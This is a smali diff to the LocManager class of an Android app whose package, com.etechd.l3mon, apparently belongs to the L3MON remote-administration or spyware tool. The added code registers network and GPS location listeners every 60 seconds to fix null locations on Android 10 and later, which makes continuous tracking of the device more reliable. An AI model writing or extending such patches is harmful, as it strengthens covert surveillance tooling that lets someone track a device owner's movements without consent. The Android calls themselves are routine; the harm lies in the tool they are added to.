@@ -182,7 +182,7 @@
 .end method
 
 .method public getLocation()Landroid/location/Location;
-    .locals 5
+    .locals 7
 
     .line 54
     const-string v0, "network"
@@ -425,6 +425,58 @@
 
     .line 101
     :cond_2
+    # Request active location updates so we get real-time data (fixes Android 10+ null location)
+    # Store 'this' (LocationListener) in v6 for contiguous invoke-virtual/range
+    move-object v6, p0
+
+    iget-boolean v0, p0, Lcom/etechd/l3mon/LocManager;->isNetworkEnabled:Z
+
+    if-eqz v0, :cond_skip_net
+
+    iget-object v0, p0, Lcom/etechd/l3mon/LocManager;->locationManager:Landroid/location/LocationManager;
+
+    if-eqz v0, :cond_skip_net
+
+    # v0=LocationManager, v1=provider string, v2-v3=minTime(long), v4=minDistance(float), v5=listener
+    iget-object v0, p0, Lcom/etechd/l3mon/LocManager;->locationManager:Landroid/location/LocationManager;
+
+    const-string v1, "network"
+
+    const-wide/16 v2, 0xea60
+
+    const/16 v4, 0xa
+
+    int-to-float v4, v4
+
+    move-object v5, v6
+
+    invoke-virtual/range {v0 .. v5}, Landroid/location/LocationManager;->requestLocationUpdates(Ljava/lang/String;JFLandroid/location/LocationListener;)V
+
+    :cond_skip_net
+    iget-boolean v0, p0, Lcom/etechd/l3mon/LocManager;->isGPSEnabled:Z
+
+    if-eqz v0, :cond_skip_gps
+
+    iget-object v0, p0, Lcom/etechd/l3mon/LocManager;->locationManager:Landroid/location/LocationManager;
+
+    if-eqz v0, :cond_skip_gps
+
+    iget-object v0, p0, Lcom/etechd/l3mon/LocManager;->locationManager:Landroid/location/LocationManager;
+
+    const-string v1, "gps"
+
+    const-wide/16 v2, 0xea60
+
+    const/16 v4, 0xa
+
+    int-to-float v4, v4
+
+    move-object v5, v6
+
+    invoke-virtual/range {v0 .. v5}, Landroid/location/LocationManager;->requestLocationUpdates(Ljava/lang/String;JFLandroid/location/LocationListener;)V
+
+    :cond_skip_gps
+
     goto :goto_0
 
     .line 99
